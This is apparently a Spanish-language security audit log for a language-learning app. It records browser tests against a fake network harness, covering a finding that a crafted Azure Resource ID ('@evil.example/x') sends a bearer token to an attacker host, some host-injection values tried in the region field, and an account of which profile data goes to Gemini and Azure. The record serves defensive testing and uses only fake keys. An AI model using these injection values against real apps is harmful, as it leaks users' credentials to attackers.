# Navegador 800×600 · red falsa (arnés `B4/arnes/net.js` + micro falso `B3/arnes/instr.js`)

Fecha 2026-10-05 ~21:10. Vite `habla-dev`. Datos del navegador: perfil ficticio «Auditor / tester» sembrado por otros bots; clave de Gemini ficticia `AIza…(36)` (valor de prueba de `entorno.md`); Azure: valores ficticios puestos por B4 y **retirados al terminar**. Ninguna petición salió a la red (el envoltorio de `fetch` responde en local). Las peticiones aparecen duplicadas por el `StrictMode` de React en desarrollo.

## P-B4-03 · AUD-FUG-401 (Resource ID `@evil.example/x`)

Al abrir Ajustes → Gemini/Azure (sin pulsar nada más; sin huella):

```
POST login.microsoftonline.com /00000000-0000-0000-0000-000000000000/oauth2/v2.0/token
     form: grant_type=client_credentials, client_id=1111…, client_secret=FAKE…(14), scope=https://management.azure.com/.default
GET  evil.example /x/providers/microsoft.insights/metrics?api-version=2023-10-01&metricnames=AudioSecondsTranscribed&…
     headers: Authorization: Bear…(20)      ← «Bearer FAKE-TOKEN-B4» (token falso devuelto por el arnés)
```

La pantalla mostró «≈ 0 min de 5 h usadas · quedan 5 h» (sin ningún aviso) y `localStorage['habla.azureUsage']` guardó `res:"@evil.example/x"`.

## P-B4-02 · Región de Azure (botón «Guardar y comprobar»)

| Región | Host que construye la app |
|---|---|
| `evil.com#` | URL inválida (`evil.com%23…` → el parser la rechaza; `fetch` real lanzaría error → «No se pudo conectar») |
| `a/b` | URL inválida |
| `evil.com?` | URL inválida |
| `x.evil.com` | `x.evil.com.api.cognitive.microsoft.com` (sigue bajo microsoft.com) |

(El «válidas ✓» que se vio es artefacto del arnés, que respondía 200 a todo.) → inyección de host por la región DESCARTADA.

## P-B4-01 · Un turno de clase reanudada («Clase en progreso», práctica «Entrevista de trabajo») con fonética activa

| # | Destino | Cabeceras | Cuerpo |
|---|---|---|---|
| 1 | `generativelanguage.googleapis.com /v1beta/models/gemini-3.8-flash:generateContent` | `x-goog-api-key: AIza…(36)` (nunca en URL) | 23 KB · `systemInstruction` con **Name: Auditor · What they do: tester · Why: work and career · Interests: news, ai, tech** + niveles y debilidades · 5 `contents` (historial completo en texto + **audio/webm 12 KB**) |
| 2 | `eastus.stt.speech.microsoft.com /speech/recognition/conversation/cognitiveservices/v1?language=en-US&format=detailed` | `Ocp-Apim-Subscription-Key: FAKE…(33)`, `Pronunciation-Assessment` (base64 con `ReferenceText:""`) | WAV 16 kHz, 126 764 B |
| 3 | ídem (2.ª pasada) | `Pronunciation-Assessment` con `ReferenceText: "I like to talk about music."` = **transcripción de Gemini** | mismo WAV |
| 4 | Gemini `gemini-3.5-flash-lite` («¿Qué digo?») | clave en cabecera | 1 KB · último mensaje del profe + niveles; sin perfil |

Otras peticiones observadas:
- **Plan de 12 semanas** (cada vez que se vuelve al Inicio mientras no hay plan guardado; con la red falsa la respuesta no es válida y se repite): `textParts` con **Name, What they do, Why, Interests**, niveles.
- **Palabras** (`run into` + frase de contexto): solo palabra, contexto y nivel B1.
- **Lista de modelos** `GET /v1beta/models?pageSize=1000` al abrir Ajustes → Gemini (solo la clave en cabecera).
- **Token Azure AD**: el `client_secret` va en el cuerpo `x-www-form-urlencoded`, no en la URL.

## P-B4-04 · `localStorage` (solo nombres, tamaños y campos)

- Claves: `CapacitorStorage.habla.settings` (947 B), `CapacitorStorage.habla.savedClass` (5 529 B), `habla.netlog` (3 869 B), `habla.azureUsage` (99 B).
- `habla.netlog` campos: `at, what, model, thinking, kb, status, ms, tokens, error`. Valores distintos de `what`: «You are an expert English teacher and curriculum d», «You are an accurate speech transcriber.», «Your name is Emma. You speak American English. You», «You are an expert, encouraging English speaking co», «You help English learners get started when speakin», «You are an expert bilingual (English–Spanish) teac» → **ninguno con datos del perfil** (H-B2-404 confirmada).
- `habla.savedClass` campos: `sessionId, scenarioId, system, history, mascot, title, turns, savedAt` (el `system` contiene el perfil, AUD-FUG-404).
